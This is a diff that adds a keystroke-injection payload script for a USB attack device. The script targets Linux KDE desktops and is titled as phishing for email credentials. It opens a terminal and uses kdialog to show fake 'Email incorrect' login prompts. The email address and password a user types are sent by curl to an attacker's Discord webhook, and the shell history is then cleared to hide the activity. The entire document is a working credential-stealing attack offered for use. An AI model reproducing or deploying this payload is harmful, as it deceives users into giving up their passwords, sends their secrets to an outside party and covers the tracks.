@@ -1,0 +1,31 @@
+* ###########################################################
+* #                                                         |
+* # Title        : Exfiltrate Email And Password By Phising |
+* # Author       : Aleff                                    |
+* # Version      : 1.0                                      |
+* # Category     : Phishing                                 |
+* # Target       : Linux                                    |
+* #                                                         |
+* ###########################################################
+
+* Requirements:
+*     - Internet Connection
+*     - Discord webhook
+*     - KDE/kdialog based
+
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+
+
+* #### POPUP SECTION ####
+
+
+* REQUIRED - Provide Discord Webhook - https://discordapp.com/api/webhooks/<webhook_id>/<token>
+QUACK STRING WEBHOOK_URL="WEBHOOK"
+QUACK ENTER
+QUACK DELAY 500
+
+* All-in-one is important
+QUACK STRING $(curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"$(echo $(kdialog --sorry 'Email incorrect.\n Will not connect to server, please retry.'; kdialog --title 'Email \n Put your email address to connect yout account.' --inputbox 'Email:'; kdialog --title 'Email Login' --password 'Email Password:';))\"}" $WEBHOOK_URL); history -c; exit;
+QUACK ENTER
